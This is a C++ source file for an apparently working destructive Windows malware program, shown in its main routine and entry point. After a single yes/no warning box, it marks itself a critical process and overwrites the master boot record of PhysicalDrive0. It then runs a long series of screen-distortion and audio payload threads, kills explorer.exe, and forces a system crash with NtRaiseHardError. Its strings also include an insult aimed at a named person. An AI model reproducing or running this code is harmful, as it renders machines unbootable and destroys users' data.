        RtlSetProcessIsCritical fSetCritical;

        hDLL = LoadLibraryA("ntdll.dll");
        
        if (hDLL != NULL)
        {
            EnablePriv(SE_DEBUG_NAME);
            (fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
            if (!fSetCritical) return 0;
            fSetCritical(1, 0, 0);
            return 1;
        }
        
        else return 0;
    }

    DWORD WINAPI FuckMBR(LPVOID lpParam)
    {
        DWORD dwBytesWritten;
        
        HANDLE hDevice = CreateFile
        (
            L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
            FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
            OPEN_EXISTING, 0, 0
        );

        WriteFile(hDevice, Bootsector, 663, &dwBytesWritten, 0);
        return 1;
    }
}

void InitPayloads()
{
    System::ProcessIsCritical();
    Sleep(1);
    CreateThread(0, 0, System::FuckMBR, 0, 0, 0);
    CreateThread(0, 0, System::Disable, 0, 0, 0);
    Sleep(2000);
    CreateThread(0, 0, System::CreateFractalizedVideo, 0, 0, 0);
    CreateThread(0, 0, System::MoveCursor, 0, 0, 0);
    CreateThread(0, 0, System::KeyboardCAPS, 0, 0, 0);
    CreateThread(0, 0, System::MoveWindow, 0, 0, 0);
    CreateThread(0, 0, System::Msgbox, 0, 0, 0);
    Sleep(12000);
    CreateThread(0, 0, System::MessDesktop, 0, 0, 0);
    CreateThread(0, 0, System::MessedLabels, 0, 0, 0);
    HANDLE GDIThread1 = CreateThread(0, 0, GDIPayloads::GDIShader1, 0, 0, 0);
    CreateThread(0, 0, Bytebeats::Sound1, 0, 0, 0);
    HANDLE GDIThreadWhile1 = CreateThread(0, 0, GDIPayloads::TextsA, 0, 0, 0);
    Sleep(30000);
    TerminateThread(GDIThread1, NULL);
    CloseHandle(GDIThread1);
    Redraw();
    HANDLE GDIThread2 = CreateThread(0, 0, GDIPayloads::GDIShader2, 0, 0, 0);
    HANDLE GDIThreadWhile2 = CreateThread(0, 0, GDIPayloads::TextsB, 0, 0, 0);
    CreateThread(0, 0, Bytebeats::Sound2, 0, 0, 0);
    Sleep(30000);
    TerminateThread(GDIThread2, NULL);
    CloseHandle(GDIThread2);
    Redraw();
    HANDLE GDIThread3 = CreateThread(0, 0, GDIPayloads::GDIShader3, 0, 0, 0);
    HANDLE GDIThreadWhile3 = CreateThread(0, 0, GDIPayloads::IconsA, 0, 0, 0);
    CreateThread(0, 0, Bytebeats::Sound3, 0, 0, 0);
    Sleep(30000);
    TerminateThread(GDIThread3, NULL);
    CloseHandle(GDIThread3);
    Redraw();
    HANDLE GDIThread4 = CreateThread(0, 0, GDIPayloads::GDIShader4, 0, 0, 0);
    HANDLE GDIThreadWhile4 = CreateThread(0, 0, GDIPayloads::InvertCircles, 0, 0, 0);
    CreateThread(0, 0, Bytebeats::Sound4, 0, 0, 0);
    Sleep(30000);
    TerminateThread(GDIThread4, NULL);
    CloseHandle(GDIThread4);
    Redraw();
    HANDLE GDIThread5 = CreateThread(0, 0, GDIPayloads::GDIShader5, 0, 0, 0);
    HANDLE GDIThreadWhile5 = CreateThread(0, 0, GDIPayloads::IconsB, 0, 0, 0);
    CreateThread(0, 0, Bytebeats::Sound5, 0, 0, 0);
    Sleep(30000);
    TerminateThread(GDIThread5, NULL);
    CloseHandle(GDIThread5);
    Redraw();
    HANDLE GDIThread6 = CreateThread(0, 0, GDIPayloads::GDIShader6, 0, 0, 0);
    HANDLE GDIThreadWhile6 = CreateThread(0, 0, GDIPayloads::IconsC, 0, 0, 0);
    CreateThread(0, 0, Bytebeats::Sound6, 0, 0, 0);
    Sleep(30000);
    TerminateThread(GDIThread6, NULL);
    CloseHandle(GDIThread6);
    Redraw();
    HANDLE GDIThread7A = CreateThread(0, 0, GDIPayloads::Blur, 0, 0, 0);
    HANDLE GDIThread7B = CreateThread(0, 0, GDIPayloads::Glitch, 0, 0, 0);
    HANDLE GDIThreadWhile7 = CreateThread(0, 0, GDIPayloads::IconsD, 0, 0, 0);
    CreateThread(0, 0, Bytebeats::Sound7, 0, 0, 0);
    Sleep(30000);
    TerminateThread(GDIThread7A, NULL);
    CloseHandle(GDIThread7A);
    TerminateThread(GDIThread7B, NULL);
    CloseHandle(GDIThread7B);
    Redraw();
    HANDLE GDIThread8 = CreateThread(0, 0, GDIPayloads::UDStretch, 0, 0, 0);
    HANDLE GDIThreadWhile8 = CreateThread(0, 0, GDIPayloads::IconsE, 0, 0, 0);
    CreateThread(0, 0, Bytebeats::Sound8, 0, 0, 0);
    Sleep(30000);
    TerminateThread(GDIThread8, NULL);
    CloseHandle(GDIThread8);
    Redraw();
    HANDLE GDIThread9 = CreateThread(0, 0, GDIPayloads::GDIShader7, 0, 0, 0);
    CreateThread(0, 0, Bytebeats::Sound9, 0, 0, 0);
    Sleep(30000);
    TerminateThread(GDIThread9, NULL);
    CloseHandle(GDIThread9);
    Redraw();
    HANDLE GDIThread10 = CreateThread(0, 0, GDIPayloads::GDIShader8, 0, 0, 0);
    CreateThread(0, 0, Bytebeats::Sound10, 0, 0, 0);
    Sleep(30000);
    TerminateThread(GDIThread10, NULL);
    CloseHandle(GDIThread10);
    Redraw();
    HANDLE GDIThread11 = CreateThread(0, 0, GDIPayloads::MythlasAthomeRemasted, 0, 0, 0);
    CreateThread(0, 0, Bytebeats::Sound11, 0, 0, 0);
    Sleep(30000);
    TerminateThread(GDIThread11, NULL);
    CloseHandle(GDIThread11);
    Redraw();
    HANDLE GDIThread12 = CreateThread(0, 0, GDIPayloads::RGBMasher, 0, 0, 0);
    CreateThread(0, 0, Bytebeats::Sound12, 0, 0, 0);
    Sleep(30000);
    TerminateThread(GDIThread12, NULL);
    CloseHandle(GDIThread12);
    Redraw();
    HANDLE GDIThread13 = CreateThread(0, 0, GDIPayloads::RainbowInvert, 0, 0, 0);
    CreateThread(0, 0, Bytebeats::Sound13, 0, 0, 0);
    Sleep(30000);
    TerminateThread(GDIThread13, NULL);
    CloseHandle(GDIThread13);
    Redraw();
    HANDLE GDIThread14 = CreateThread(0, 0, GDIPayloads::MoreBlur, 0, 0, 0);
    CreateThread(0, 0, Bytebeats::Sound14, 0, 0, 0);
    Sleep(30000);
    TerminateThread(GDIThread14, NULL);
    CloseHandle(GDIThread14);
    Redraw();
    HANDLE GDIThread15 = CreateThread(0, 0, GDIPayloads::GDIShader9, 0, 0, 0);
    CreateThread(0, 0, Bytebeats::Sound15, 0, 0, 0);
    Sleep(30000);
    TerminateThread(GDIThread15, NULL);
    CloseHandle(GDIThread15);
    Redraw();
    ShellExecuteA(NULL, NULL, "taskkill", "/f /im explorer.exe", NULL, SW_SHOWDEFAULT);
    HANDLE GDIThread16 = CreateThread(0, 0, GDIPayloads::MoreMythlasAthome, 0, 0, 0);
    CreateThread(0, 0, Bytebeats::Sound16, 0, 0, 0);
    Sleep(30000);
    TerminateThread(GDIThread16, NULL);
    CloseHandle(GDIThread16);
    Redraw();
    Sleep(50);

    BOOLEAN bl;
    DWORD response;
    NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
    RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
    RtlAdjustPrivilege(19, 1, 0, &bl);
    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
    Sleep(-1);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
    if
    (
        MessageBoxW
        (
            NULL,
            L"You know perfectly the warnings, so i don't gonna write too much.\n\nDo you want run?",
            L"'UnderwaterTinyKong is a fucking retard'",
            MB_ICONWARNING | MB_YESNO
        ) != IDYES
    ) return 1;

    InitPayloads();
}